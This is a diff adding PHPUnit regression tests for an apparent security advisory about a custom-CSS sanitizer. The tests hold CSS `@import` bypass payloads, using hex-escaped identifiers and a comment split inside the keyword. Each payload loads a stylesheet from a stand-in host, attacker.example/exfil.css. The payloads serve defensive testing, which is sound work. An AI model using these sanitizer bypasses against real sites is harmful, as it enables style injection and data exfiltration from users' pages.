@@ -147,4 +147,66 @@ class SettingCustomCssTest extends TestCase
 
         $this->assertStringNotContainsString('attacker.example', $out);
     }
+
+    // GHSA-gc22-r333-8q45 regression coverage. The reporter's PoC:
+    // CSS lets you write hex escapes inside identifiers, so
+    // `@\69 mport` (where `\69 ` is the hex escape for 0x69 = 'i')
+    // parses as `@import` in a browser but did not match the
+    // source-text regex looking for the literal `@import`. The fix
+    // refuses any CSS containing a backslash outright, matching the
+    // posture the url() guard was already using for its own escape
+    // bypass class.
+    public function test_import_at_rule_with_hex_escaped_ident_is_stripped(): void
+    {
+        $out = $this->withCustomCss('@\69 mport"https://attacker.example/exfil.css";');
+
+        $this->assertStringNotContainsString('attacker.example', $out);
+        $this->assertStringNotContainsString('mport', $out);
+    }
+
+    // Full six-digit hex escape variant of the same bypass class.
+    // `\000069` also decodes to 'i'. Rejecting all backslashes covers
+    // every hex escape length CSS accepts.
+    public function test_import_at_rule_with_full_hex_escaped_ident_is_stripped(): void
+    {
+        $out = $this->withCustomCss('@\000069mport"https://attacker.example/exfil.css";');
+
+        $this->assertStringNotContainsString('attacker.example', $out);
+        $this->assertStringNotContainsString('mport', $out);
+    }
+
+    // CSS strips comments during tokenization at every position except
+    // inside strings, so `@im/*c*/port` parses as `@import` even though
+    // no version of the source-text regex could ever match that literal.
+    // The fix strips comments before running the regex.
+    public function test_import_at_rule_with_comment_inside_keyword_is_stripped(): void
+    {
+        $out = $this->withCustomCss('@im/*c*/port "https://attacker.example/exfil.css";');
+
+        $this->assertStringNotContainsString('attacker.example', $out);
+        $this->assertStringNotContainsString('@import', $out);
+    }
+
+    // Positive control: legitimate CSS with a comment should still
+    // render (comments are stripped before sanitizing, but the
+    // surrounding CSS survives).
+    public function test_legitimate_css_with_comments_is_preserved(): void
+    {
+        $out = $this->withCustomCss("/* branding header */\nbody { color: #ff0000; }\n/* end */");
+
+        $this->assertStringContainsString('body', $out);
+        $this->assertStringContainsString('#ff0000', $out);
+    }
+
+    // Positive control: any CSS containing a backslash is rejected
+    // wholesale, matching the docstring on the new guard. This is a
+    // trade-off flagged in the fix comment: legitimate CSS with escape
+    // sequences (rare in branding) is refused, and the operator sees
+    // an empty output rather than partially-sanitized input.
+    public function test_css_with_stray_backslash_is_rejected(): void
+    {
+        $out = $this->withCustomCss('body { content: "hi\\A world"; }');
+
+        $this->assertSame('', $out);
+    }
 }
